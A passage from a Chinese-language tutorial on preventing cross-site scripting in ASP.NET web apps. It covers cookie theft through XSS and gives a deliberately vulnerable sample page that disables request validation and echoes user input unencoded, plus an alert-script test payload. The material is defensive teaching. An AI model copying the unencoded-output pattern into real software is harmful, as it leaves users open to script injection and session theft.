normal; text-decoration: none">SOP</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">？你肯定不希望在访问</span><a href="http://www.bad-url.com/"><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000099; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">www.bad-url.com</span></a><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的时候它里面的脚本可以阅读</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">www.hotmail.coml</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">中的内容。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">基于</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">SOP</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">，一个域存放的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Cookie</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">只能和该域的服务器打交道。例如，</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">hotmail</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Cookie</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">只能给</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> hotmail</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">服务器使用。其它任何网站都不能获取这个</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Cookie</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">正因为</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Cookie</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的这个特性，在许多</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Web</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">应用的设计上，都是先用</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">https</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">来验证用户的登录名和密码，然后发送一个特殊的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Session Cookie</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">来代表用户验证过的身份。举个例子，如果</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">hotmail</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">存在在</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">漏洞，一个用户的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">hotmail</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">session cookie</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">就可能被攻击者获取。攻击者然后就可以用这个</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">session cookie</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">，以这个用户的身份访问</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">hotmail</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">，从而造成敏感信息的泄漏（</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">information disclosure</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">）。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">这一点不仅限于cookie,如果有xss漏洞，则可以使用跨站脚本，当合法用户操作时执行了恶意站点的代码。参见</span> <br /><a href=""><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000099; font-size: 15pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">http://www.laabc.com/?p=18356</span></a><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"></span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">4.如何避免XSS安全漏洞</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">虽然在</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">IE8</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">中引入了客户端的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">过滤器以减少</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">对用户造成的危害，但是</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">本质上是</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Web</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">应用服务的漏洞，仅仅依赖客户端的保护措施是不够的。解决问题的根本是在</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Web</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">应用程序的代码中消除</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">安全漏洞。</span> <br /><span style="background-color: #6aa84f; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">以下是在</span><span style="background-color: #6aa84f; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Web</span><span style="background-color: #6aa84f; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">应用的开发中避免</span><span style="background-color: #6aa84f; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: #6aa84f; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">安全漏洞的几个原则：</span> </p> <ul> <li style="background-color: transparent; list-style-type: disc; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"><span style="background-color: #6aa84f; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">检查所有产生动态网页的代码</span> </li> <li style="background-color: transparent; list-style-type: disc; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"><span style="background-color: #6aa84f; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">判定动态网页的内容是否包括不安全的输入信息</span> </li> <li style="background-color: transparent; list-style-type: disc; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"><span style="background-color: #6aa84f; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">对输入进行校验</span> </li> <li style="background-color: transparent; list-style-type: disc; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"><span style="background-color: #6aa84f; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">对输出进行编码以过滤特殊字符</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"></span> </li> </ul> <p><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">采用不同的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Web</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">开发工具，实施以上原则的具体步骤也不相同。下面我们就用微软的</span><a href="http://asp.net/"><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000099; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">ASP.NET</span></a><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">来举例。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">设想如下的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ASP.net</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">应用【</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">2</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">】：</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;%@ Page Language=”C#” ValidateRequest=”false” %&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;html&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;script runat=”server”&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">void btnSubmit_Click(Object sender, EventArgs e)</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">{</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">// If ValidateRequest is false, then ‘hello’ is displayed</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">// If ValidateRequest is true, then</span><a href="http://asp.net/"><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> </span><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000099; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">ASP.NET</span></a><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> returns an exception</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Response.Write(txtString.Text);</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">}</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/script&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;body&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;form id=”form1″ runat=”server”&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;asp:TextBox id=”txtString” runat=”server”</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Text=”&lt;script&gt;alert(‘hello’);&lt;/script&gt;” /&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;asp:Button id=”btnSubmit” runat=”server”</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">OnClick=”btnSubmit_Click”</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Text=”Submit” /&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/form&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/body&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/html&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">细心的读者可能注意到上面有一个特殊的设置</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ValidateRequest=”false”</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">。我们以后会对它详细说明。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">检查所有产生动态网页的代码</span> <br /><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ASP.net</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">有两种方式产生动态网页。一个是通过</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Response.Write</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">，一个是通过</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;%=</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">判定动态网页的内容是否包括用户输入的信息</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">例如，检查</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Response.write</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的输出数据的来源。上例中它的数据源于</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">txtString</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">，是源自用户的输入数据。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">验证用户的输入</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ValidateRequest选项</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">缺省情况下，在</span><a href="http://asp.net/"><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000099; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">ASP.NET</span></a><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">machine.config</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">文件中，</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">validateRequest</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">选项是打开的。</span><a href="http://asp.net/"><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000099; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">ASP.NET</span></a><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">会自动对用户输入作一定的验证。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">例如，当</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ValidateRequest</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的值为</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">true</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的话，如果用户输入</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">txtstring</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的值为</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;script&gt;alert(‘hello’);&lt;/script&gt;</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">。</span><a href="http://asp.net/"><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000099; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">ASP.NET</span></a><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">会有产生如下异常信息：</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HttpRequestValidationException (0×80004005): A potentially dangerous Request.Form value was detected from the client (txtString=”&lt;script&gt;alert(‘hello…”).]</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">System.Web.HttpRequest.ValidateString(String s, String valueName, String collectionName) +3307682</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">System.Web.HttpRequest.ValidateNameValueCollection(NameValueCollection nvc, String collectionName) +108</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">System.Web.HttpRequest.get_Form() +119</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">System.Web.HttpRequest.get_HasForm() +3309630</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">System.Web.UI.Page.GetCollectionBasedOnMethod(Boolean dontReturnNull) +45</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">System.Web.UI.Page.DeterminePostBackMode() +65</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +7350</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +213</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">System.Web.UI.Page.ProcessRequest() +86</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">System.Web.UI.Page.ProcessRequestWithNoAssert(HttpContext context) +18</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">System.Web.UI.Page.ProcessRequest(HttpContext context) +49</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">需要强调的一点是：</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ValidateRequest</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">只是</span><a href="http://asp.net/"><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000099; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">ASP.NET</span></a><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">提供的深层防御手段（</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Defense-in-Depth</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">）。</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Web</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">开发中不能仅依赖它，而没有专门的对输入的校验代码。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">对不安全输入信息的校验。</span> <ul> <li style="background-color: transparent; list-style-type: disc; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">校验来自服务器端控制的输入，可以考虑使用</span><a href="http://asp.net/"><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> </span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000099; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">ASP.NET</span></a><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">中的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> RegularExpressionValidator</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">和</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> RangeValidator.</span> </li> <li style="background-color: transparent; list-style-type: disc; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">校验来自客户端</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">HTML</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的输入，例如</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">QueryString</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">，客户端的输入控制，</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; 